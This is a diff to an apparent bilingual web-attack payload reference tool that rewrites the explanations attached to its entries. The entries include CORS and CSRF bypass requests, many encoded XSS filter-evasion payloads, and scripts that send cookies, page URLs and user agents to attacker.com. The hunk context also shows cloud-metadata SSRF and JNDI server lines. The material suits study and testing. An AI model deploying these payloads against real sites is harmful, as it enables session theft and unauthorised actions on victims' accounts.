+              { part: 'Access-Control-Allow-Origin: null', explanation: { zh: '允许null源：沙箱iframe/本地文件页面的Origin即为null', en: 'Allowing null origin (sandboxed iframes)' }, type: 'header' },
+              { part: 'Access-Control-Allow-Credentials: true', explanation: { zh: '允许携带凭证：使跨域窃取成为可能', en: 'Credentials allowed enables cross-origin theft' }, type: 'header' },
+              { part: 'Access-Control-Allow-Origin: *', explanation: { zh: '通配符任意源(带凭证时浏览器拒绝，但仍是危险配置)', en: 'Wildcard origin (invalid with credentials)' }, type: 'header' },
+              { part: '反射Origin', explanation: { zh: '服务端反射任意Origin是最危险的错误配置', en: 'Reflecting arbitrary Origin is the worst misconfiguration' }, type: 'technique' },
             ],
         description: { zh: '利用CORS配置错误', en: 'ExploitationCORS Misconfiguration' }, 
         platform: 'all'
@@ -4677,8 +4679,8 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '混合内容', en: 'Mixed content' }, 
         command: '# HTTPS->HTTP降级\n从HTTPS站点发起HTTP请求\n某些情况下不发送SameSite',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' HTTPS->HTTP降级\n从HTTPS站点发起HTTP请求\n某些情况下不发送SameSite', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'HTTPS->HTTP降级', explanation: { zh: '从HTTPS页面发起HTTP请求形成跨协议上下文', en: 'Cross-protocol downgrade request' }, type: 'technique' },
+              { part: '从HTTPS站点发起HTTP请求', explanation: { zh: '部分浏览器对降级请求不附加SameSite Cookie', en: 'Browsers may omit SameSite cookie on downgrade' }, type: 'value' },
             ],
         description: { zh: '利用混合内容', en: 'Exploit mixed content' }, 
         platform: 'all'
@@ -4687,8 +4689,7 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '客户端重定向', en: 'ClientRedirect' }, 
         command: '# JavaScript重定向\nlocation.href = "http://target.com/action"\n可能绕过某些SameSite检查',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' JavaScript重定向\nlocation.href = "http://target.com/action"\n可能绕过某些SameSite检查', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'location.href = "http://target.com/action"', explanation: { zh: 'JS导航到目标操作地址，可绕过部分SameSite检查', en: 'JS navigation may bypass SameSite checks' }, type: 'function' },
             ],
         description: { zh: '客户端重定向', en: 'ClientRedirect' }, 
         platform: 'all'
@@ -4754,8 +4755,9 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '方法覆盖', en: 'Method override' }, 
         command: '# 使用_method参数\nPOST /action?_method=PUT&token=xxx\n\n# 使用X-HTTP-Method-Override\nX-HTTP-Method-Override: PUT',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 使用_method参数\nPOST /action?_method=PUT&token=xxx\n\n# 使用X-HTTP-Method-Override\nX-HTTP-Method-Override: PUT', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'POST /action?_method=PUT&token=xxx', explanation: { zh: 'POST请求经_method参数改写实际方法', en: 'POST rewritten via _method parameter' }, type: 'method' },
+              { part: '_method=PUT', explanation: { zh: '_method参数指定覆盖后的HTTP方法', en: 'Parameter specifying the override method' }, type: 'parameter' },
+              { part: 'X-HTTP-Method-Override: PUT', explanation: { zh: '请求头方式覆盖HTTP方法', en: 'Header-based method override' }, type: 'header' },
             ],
         description: { zh: '方法覆盖绕过', en: 'Method override bypass' }, 
         platform: 'all'
@@ -4764,9 +4766,8 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: 'JSON格式', en: 'JSONFormat' }, 
         command: '# 使用JSON格式提交\nContent-Type: application/json\n{"token": "xxx", "action": "delete"}\n\n# 可能绕过Token验证',
             syntaxBreakdown: [
-              { part: '# 使用JSON格式提交\nContent-Type: application/json\n{"token": "xxx", "action": "', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' },
-              { part: 'delete', explanation: { zh: 'SQL关键字', en: 'SQLCriticalCharacter' }, type: 'keyword' },
-              { part: '"}\n\n# 可能绕过Token验证', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' }
+              { part: 'Content-Type: application/json', explanation: { zh: 'JSON提交可能绕过仅针对表单的Token校验逻辑', en: 'JSON submission may bypass form-only token checks' }, type: 'header' },
+              { part: '{"token": "xxx", "action": "delete"}', explanation: { zh: 'JSON体携带token与要执行的操作', en: 'JSON body with token and action' }, type: 'json' },
             ],
         description: { zh: 'JSON格式绕过', en: 'JSONFormatBypass' }, 
         platform: 'all'
@@ -4827,8 +4828,8 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: 'iframe嵌入', en: 'iframe embedding' }, 
         command: '# 使用iframe嵌入目标\n<iframe src="http://target.com" referrerpolicy="no-referrer">\n\n# sandbox属性\n<iframe sandbox="allow-scripts" src="...">',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 使用iframe嵌入目标\n<iframe src="http://target.com" referrerpolicy="no-referrer">\n\n# sandbox属性\n<iframe sandbox="allow-scripts" src="...">', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '<iframe src="http://target.com" referrerpolicy="no-referrer">', explanation: { zh: 'iframe嵌入目标且不发送Referer', en: 'Embedded iframe without Referer' }, type: 'tag' },
+              { part: 'sandbox="allow-scripts"', explanation: { zh: 'sandbox隔离仅放行脚本权限', en: 'Sandbox allowing only scripts' }, type: 'parameter' },
             ],
         description: { zh: 'iframe绕过', en: 'iframeBypass' }, 
         platform: 'all'
@@ -4837,8 +4838,8 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: 'Flash/SWF', 
         command: '# Flash可以控制Referer\n# 编译SWF发送自定义Referer',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' Flash可以控制Referer\n# 编译SWF发送自定义Referer', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'Flash可以控制Referer', explanation: { zh: 'Flash可自定义HTTP请求头，构造任意Referer', en: 'Flash can craft arbitrary Referer' }, type: 'concept' },
+              { part: '编译SWF发送自定义Referer', explanation: { zh: '编译SWF发起携带伪造Referer的请求', en: 'Compiled SWF sends forged Referer' }, type: 'concept' },
             ],
         description: { zh: 'Flash控制Referer', en: 'Flash controls Referer' }, 
         platform: 'all'
@@ -4904,8 +4905,9 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '绕过预检请求', en: 'Bypass preflight request' }, 
         command: '# Flash可以绕过CORS预检\n# 直接发送POST请求\n# 携带Cookie',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' Flash可以绕过CORS预检\n# 直接发送POST请求\n# 携带Cookie', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'Flash可以绕过CORS预检', explanation: { zh: 'Flash的crossdomain.xml机制可绕过CORS预检限制', en: 'Flash bypasses CORS preflight' }, type: 'concept' },
+              { part: '直接发送POST请求', explanation: { zh: '以简单请求形式直接发送POST', en: 'Send POST directly as simple request' }, type: 'concept' },
+              { part: '携带Cookie', explanation: { zh: '请求自动附带受害者Cookie', en: 'Requests carry victim cookies' }, type: 'concept' },
             ],
         description: { zh: '绕过CORS预检', en: 'Bypass CORS preflight' }, 
         platform: 'all'
@@ -4970,7 +4972,11 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '窃取敏感数据', en: 'StealSensitiveData' }, 
         command: '# 利用CORS窃取数据\nfetch("http://target.com/api/user", {\n  credentials: "include"\n})\n.then(r => r.json())\n.then(data => {\n  new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(JSON.stringify(data));\n});',
             syntaxBreakdown: [
-              { part: '# 利用CORS窃取数据\nfetch("http://target.com/api/user", {\n  credentials: "include"\n}', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'fetch("http://target.com/api/user"', explanation: { zh: 'fetch跨域请求目标API', en: 'Cross-origin fetch to target API' }, type: 'function' },
+              { part: 'credentials: "include"', explanation: { zh: '携带受害者Cookie凭证', en: 'Include victim cookies' }, type: 'parameter' },
+              { part: 'r.json()', explanation: { zh: '解析JSON响应', en: 'Parse JSON response' }, type: 'function' },
+              { part: 'new Image().src', explanation: { zh: '构造图片GET请求外带数据', en: 'Image request exfiltrates data' }, type: 'function' },
+              { part: 'http://attacker.com/log?data=', explanation: { zh: '外带地址：日志接口携带data参数', en: 'Exfiltration endpoint with data parameter' }, type: 'domain' },
             ],
         description: { zh: '窃取用户数据', en: 'StealUsersData' }, 
         platform: 'all'
@@ -4979,9 +4985,10 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '执行敏感操作', en: 'ExecuteSensitiveoperation' }, 
         command: '# 利用CORS执行操作\nfetch("http://target.com/api/delete", {\n  method: "POST",\n  credentials: "include",\n  headers: {"Content-Type": "application/json"},\n  body: JSON.stringify({id: 123})\n});',
             syntaxBreakdown: [
-              { part: '# 利用CORS执行操作\nfetch("http://target.com/api/', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' },
-              { part: 'delete', explanation: { zh: 'SQL关键字', en: 'SQLCriticalCharacter' }, type: 'keyword' },
-              { part: '", {\n  method: "POST",\n  credentials: "include",\n  headers: {"Content-Type": "application/json"},\n  body: JSON.stringify({id: 123})\n});', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' }
+              { part: 'fetch("http://target.com/api/delete"', explanation: { zh: '向删除接口发起跨域请求', en: 'Cross-origin request to delete endpoint' }, type: 'function' },
+              { part: 'method: "POST"', explanation: { zh: 'POST方法执行写操作', en: 'POST method for write action' }, type: 'method' },
+              { part: 'credentials: "include"', explanation: { zh: '携带受害者Cookie', en: 'Include victim cookies' }, type: 'parameter' },
+              { part: 'body: JSON.stringify({id: 123})', explanation: { zh: 'JSON请求体指定操作对象', en: 'JSON body specifying target object' }, type: 'json' },
             ],
         description: { zh: '执行敏感操作', en: 'ExecuteSensitiveoperation' }, 
         platform: 'all'
@@ -5465,17 +5472,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '嵌套标签绕过', en: 'nestedtagBypass' }, 
         command: '<svg><script>&#97;lert(1)</script></svg>\n<svg><script>a&#108;ert(1)</script></svg>',
             syntaxBreakdown: [
-              { part: '<svg>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '&#97;lert(1)', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '</svg>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<svg>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'a&#108;ert(1)', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '</svg>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: '<svg><script>', explanation: { zh: 'SVG命名空间内的script标签', en: 'Script tag inside SVG namespace' }, type: 'tag' },
+              { part: '&#97;lert(1)', explanation: { zh: '首字符a以十进制实体编码的alert调用', en: 'alert with first char as decimal entity' }, type: 'value' },
+              { part: 'a&#108;ert(1)', explanation: { zh: '第二字符l实体编码的变体', en: 'Variant with second char encoded' }, type: 'value' },
             ],
         description: { zh: 'SVG内脚本编码绕过', en: 'SVGInsideScriptEncoding Bypass' }, 
         platform: 'all',
@@ -5545,9 +5544,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '混合编码绕过', en: 'Mixed encoding bypass' }, 
         command: '<img src=x onerror=\\u0061&#108;ert(1)>\n<img src=x onerror="\\u0061lert`1`">',
             syntaxBreakdown: [
-              { part: '<img src=x onerror=\\\u0061&#108;ert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<img src=x onerror="\\\u0061lert`1`">', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: '\\u0061', explanation: { zh: 'a的JS Unicode转义形式(仅特定解析语境生效)', en: 'Unicode escape for letter a' }, type: 'encoding' },
+              { part: 'alert`1`', explanation: { zh: '模板字符串反引号调用alert', en: 'alert invoked via template literal' }, type: 'function' },
             ],
         description: { zh: '混合多种编码方式', en: 'Mix multiple encoding methods' }, 
         platform: 'all'
@@ -5556,8 +5554,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '过长UTF-8编码', en: 'Overlong UTF-8 encoding' }, 
         command: '<img src=x onerror=alert(1)>\n使用非最短UTF-8编码形式',
             syntaxBreakdown: [
-              { part: '<img src=x onerror=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n使用非最短UTF-8编码形式', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' }
+              { part: '<img src=x onerror=alert(1)>', explanation: { zh: '标准img事件载荷', en: 'Standard IMG event payload' }, type: 'tag' },
+              { part: '使用非最短UTF-8编码形式', explanation: { zh: '利用过长UTF-8编码字节绕过规范化检测', en: 'Overlong UTF-8 bypasses normalization' }, type: 'technique' },
             ],
         description: { zh: '利用服务器UTF-8解析差异', en: 'Exploiting server UTF-8 parsing differences' }, 
         platform: 'all'
@@ -5632,18 +5630,12 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '6. 事件处理器变体', en: '6. EventprocessingToolVariant' }, 
         command: '<body onpageshow=alert(1)>\n<input onfocus=alert(1) autofocus>\n<marquee onstart=alert(1)>\n<video><source onerror=alert(1)>\n<details open ontoggle=alert(1)>\n<audio src=x onerror=alert(1)>',
             syntaxBreakdown: [
-              { part: '<body onpageshow=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<input onfocus=alert(1) autofocus>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<marquee onstart=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<video>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<source onerror=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<details open ontoggle=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<audio src=x onerror=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: '<body onpageshow=alert(1)>', explanation: { zh: 'body页面显示时触发事件', en: 'Fires when page is shown' }, type: 'tag' },
+              { part: '<input onfocus=alert(1) autofocus>', explanation: { zh: 'autofocus自动聚焦触发onfocus', en: 'autofocus triggers onfocus' }, type: 'tag' },
+              { part: '<marquee onstart=alert(1)>', explanation: { zh: 'marquee开始滚动时触发', en: 'Fires when marquee starts' }, type: 'tag' },
+              { part: '<video><source onerror=alert(1)>', explanation: { zh: 'source资源加载失败触发onerror', en: 'Fires when source fails to load' }, type: 'tag' },
+              { part: '<details open ontoggle=alert(1)>', explanation: { zh: 'open属性默认展开触发ontoggle', en: 'open attribute triggers ontoggle' }, type: 'tag' },
+              { part: '<audio src=x onerror=alert(1)>', explanation: { zh: 'audio资源加载失败触发onerror', en: 'Fires when audio fails to load' }, type: 'tag' },
             ],
         description: { zh: '使用少见的事件处理器', en: 'Use uncommon event handlers' }, 
         },
@@ -5653,16 +5645,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: 'Data URI绕过', en: 'Data URIBypass' }, 
         command: '<a href="data:text/html,<script>alert(1)</script>">click</a>\n<iframe src="data:text/html,<script>alert(1)</script>">',
             syntaxBreakdown: [
-              { part: '<a href="data:text/html,<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'alert(1)', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '">click', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</a>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<iframe src="data:text/html,<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'alert(1)', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '">', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' }
+              { part: 'data:text/html', explanation: { zh: 'data URI声明HTML内容类型', en: 'data URI declaring HTML content' }, type: 'format' },
+              { part: '<a href="data:text/html,<script>alert(1)</script>">click</a>', explanation: { zh: 'a标签data URI：点击链接执行脚本', en: 'Anchor executes script on click' }, type: 'tag' },
+              { part: '<iframe src="data:text/html,<script>alert(1)</script>">', explanation: { zh: 'iframe自动加载执行无需交互', en: 'iframe executes without interaction' }, type: 'tag' },
             ],
         description: { zh: '使用Data URI', en: 'UseData URI' }, 
         platform: 'all'
@@ -5671,11 +5656,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: 'SVG动画绕过', en: 'SVG animation bypass' }, 
         command: '<svg><animate onbegin=alert(1)>\n<svg><set onbegin=alert(1)>',
             syntaxBreakdown: [
-              { part: '<svg>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<animate onbegin=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<svg>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '<set onbegin=alert(1)>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: '<animate onbegin=alert(1)>', explanation: { zh: 'SVG animate动画开始事件触发', en: 'Fires when SVG animation begins' }, type: 'tag' },
+              { part: '<set onbegin=alert(1)>', explanation: { zh: 'SVG set元素开始事件触发', en: 'Fires when SVG set begins' }, type: 'tag' },
             ],
         description: { zh: 'SVG动画事件', en: 'SVG animation event' }, 
         platform: 'all'
@@ -5735,11 +5717,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. CSS编码', en: '4. CSSEncoding' }, 
         command: '<style>body{background:url("javascript:alert(1)")}</style>\n<div style="x:expression(alert(1))">',
             syntaxBreakdown: [
-              { part: '<style>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'body{background:url("javascript:alert(1)")}', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</style>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<div style="x:expression(alert(1))">', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: '<style>', explanation: { zh: 'style标签包裹CSS载荷', en: 'Style tag wrapping CSS payload' }, type: 'tag' },
+              { part: 'body{background:url("javascript:alert(1)")}', explanation: { zh: 'CSS url中夹带伪协议(旧版IE可执行)', en: 'Pseudo-protocol in CSS url (legacy IE)' }, type: 'value' },
+              { part: '<div style="x:expression(alert(1))">', explanation: { zh: 'IE专有expression属性执行JS', en: 'IE-only expression executes JS' }, type: 'value' },
             ],
         description: { zh: 'CSS编码（旧版IE）', en: 'CSS encoding (legacy IE)' }, 
         platform: 'all'
@@ -5748,11 +5728,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '5. 混合编码', en: '5. Mixed encoding' }, 
         command: '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">\n<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>',
             syntaxBreakdown: [
-              { part: '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'click', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</a>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: '&#97;&#108;&#101;&#114;&#116;(1)', explanation: { zh: 'alert函数名的十进制实体编码形式', en: 'Decimal entities encoding alert' }, type: 'encoding' },
+              { part: '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;', explanation: { zh: 'javascript:伪协议的实体编码', en: 'Entities encoding javascript:' }, type: 'encoding' },
+              { part: '<a href="&#106;...', explanation: { zh: '实体编码放在a标签href中点击触发', en: 'Entity-encoded href payload' }, type: 'tag' },
             ],
         description: { zh: '混合多种编码', en: 'Mix multiple encodings' }, 
         },
@@ -5762,7 +5740,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '双重URL编码', en: 'DoubleURL Encoding' }, 
         command: '%253Cscript%253Ealert(1)%253C/script%253E\n服务器解码两次时使用',
             syntaxBreakdown: [
-              { part: '%253Cscript%253Ealert(1)%253C/script%253E\n服务器解码两次时使用', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' }
+              { part: '%253Cscript%253E', explanation: { zh: '双重URL编码的<script>标签(%25解码为%)', en: 'Double-encoded <script> tag' }, type: 'encoding' },
+              { part: 'alert(1)', explanation: { zh: '弹窗代码本体未编码', en: 'Alert code itself unencoded' }, type: 'value' },
+              { part: '服务器解码两次时使用', explanation: { zh: '适用场景：服务端对输入经历两次URL解码', en: 'Use when server decodes twice' }, type: 'concept' },
             ],
         description: { zh: '双重URL编码', en: 'DoubleURL Encoding' }, 
         platform: 'all'
@@ -5771,7 +5751,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: 'UTF-16编码', en: 'UTF-16Encoding' }, 
         command: '%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E',
             syntaxBreakdown: [
-              { part: '%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' }
+              { part: '%00', explanation: { zh: 'UTF-16编码的空字节前缀，打散<script>特征', en: 'UTF-16 null bytes interleaved with payload' }, type: 'encoding' },
+              { part: '%3C%00s%00c%00r%00i%00p%00t%00%3E', explanation: { zh: '空字节间隔的<script>标签编码形式', en: 'Encoded <script> with null separators' }, type: 'encoding' },
+              { part: 'alert(1)', explanation: { zh: '未编码的弹窗代码本体', en: 'Unencoded alert body' }, type: 'value' },
             ],
         description: { zh: 'UTF-16编码绕过', en: 'UTF-16Encoding Bypass' }, 
         platform: 'all'
@@ -5880,9 +5862,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '3. XMLHttpRequest窃取', en: '3. XMLHttpRequestSteal' }, 
         command: '<script>\nvar xhr = new XMLHttpRequest();\nxhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);\nxhr.send();\n</script>',
             syntaxBreakdown: [
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\nvar xhr = new XMLHttpRequest();\nxhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);\nxhr.send();\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: 'var xhr = new XMLHttpRequest();', explanation: { zh: '创建XHR请求对象', en: 'Create XHR object' }, type: 'function' },
+              { part: 'xhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);', explanation: { zh: 'GET请求把document.cookie作为参数外带', en: 'GET request exfiltrates document.cookie' }, type: 'function' },
+              { part: 'xhr.send();', explanation: { zh: '发送请求完成外带', en: 'Send the request' }, type: 'function' },
             ],
         description: { zh: '使用XHR发送', en: 'UseXHRSend' }, 
         platform: 'all'
@@ -5900,9 +5882,11 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '5. 完整利用脚本', en: '5. completeExploitationScript' }, 
         command: '<script>\nvar img = new Image();\nimg.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);\n</script>',
             syntaxBreakdown: [
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\nvar img = new Image();\nimg.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);\n', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' }
+              { part: 'var img = new Image();', explanation: { zh: '创建Image对象以发起GET请求', en: 'Create Image object for GET request' }, type: 'function' },
+              { part: 'encodeURIComponent(document.cookie)', explanation: { zh: '读取Cookie并URL编码后作为查询参数', en: 'URL-encode cookie as query parameter' }, type: 'function' },
+              { part: 'encodeURIComponent(location.href)', explanation: { zh: '当前页面地址一并编码外带', en: 'Also exfiltrate current URL' }, type: 'function' },
+              { part: 'encodeURIComponent(navigator.userAgent)', explanation: { zh: '浏览器UA信息一并编码外带', en: 'Also exfiltrate user agent' }, type: 'function' },
+              { part: 'img.src = "http://attacker.com/log?cookie=..."', explanation: { zh: '构造图片请求地址触发外带', en: 'Image src triggers exfiltration' }, type: 'value' },
             ],
         description: { zh: '收集完整信息', en: 'CollectcompleteInformation' }, 
         },
